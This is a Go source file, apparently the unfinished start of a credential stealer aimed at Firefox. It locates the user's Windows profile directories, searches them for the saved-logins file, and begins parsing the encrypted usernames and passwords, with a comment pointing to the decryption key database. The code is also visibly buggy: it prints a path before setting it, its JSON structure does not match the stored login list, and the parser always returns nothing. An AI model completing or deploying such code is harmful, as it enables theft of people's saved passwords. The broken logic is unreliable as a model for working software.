package internals

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
)

type Firefox struct {
	name     string
	basePath string
	// profilePaths  []string needed??
	decryptionKey []byte // found in "keyX.db"
}

func NewFirefox() (Firefox, error) {
	fmt.Print("[+] Initializing Firefox\n")
	name := "firefox"
	basePath, err := getFirefoxBasePath(name)
	if err != nil {
		return Firefox{name, basePath, make([]byte, 0)}, err
	}
	fmt.Printf("[+] Base Path: %s\n", basePath)
	return Firefox{name, basePath, make([]byte, 0)}, err
}

// TODO: add other gecko (?) based browsers
func getFirefoxBasePath(browser string) (string, error) {
	// TODO: if GOOS is Windows {...} else if Linux {...} else {not implemented}
	homeDir, _ := os.UserHomeDir()

	basePaths := map[string][]string{
		"firefox": {
			fmt.Sprintf("%s\\AppData\\Local\\Mozilla\\Firefox\\Profiles", homeDir),
			fmt.Sprintf("%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", homeDir),
		},
	}

	paths, ok := basePaths[browser]
	if !ok {
		return string(""), errors.New("[!] Not Found")
	}

	// basically should decide what path is the right one
	var loginFound bool = false
	var validPath string = string("")
	for _, path := range paths {
		content, err := os.ReadDir(path)
		if err != nil {
			fmt.Printf("[!] warning: %s\n", err.Error())
			continue
		}

		for _, profile := range content {
			if strings.HasSuffix(profile.Name(), "default") {
				// should skip???
				continue
			}
			files, err := os.ReadDir(fmt.Sprintf("%s\\%s", path, profile.Name()))
			if err != nil {
				return string("err"), err
			}

			for _, file := range files {
				if file.Name() == "logins.json" {
					loginFound = true
				}
			}
		}

		if loginFound == true {
			fmt.Printf("Found valid path: %s\n", validPath)
			validPath = path
			break
		}
	}
	return validPath, nil
}

// path should point to logins.json
func getFirefoxCredentials(path string) ([]Credentials, error) {
	credentials := make([]Credentials, 0)
	loginsFile, err := os.ReadFile(path)
	if err != nil {
		return credentials, err
	}

	var data struct {
		Logins struct {
			Stored struct {
				Hostname string `json:"hostname"`
				Username []byte `json:"encryptedUsername"`
				Password []byte `json:"encryptedPassword"`
			}
		} `json:"logins"`
	}
	err = json.Unmarshal(loginsFile, &data)
	if err != nil {
		return credentials, err
	}

	return credentials, nil
}
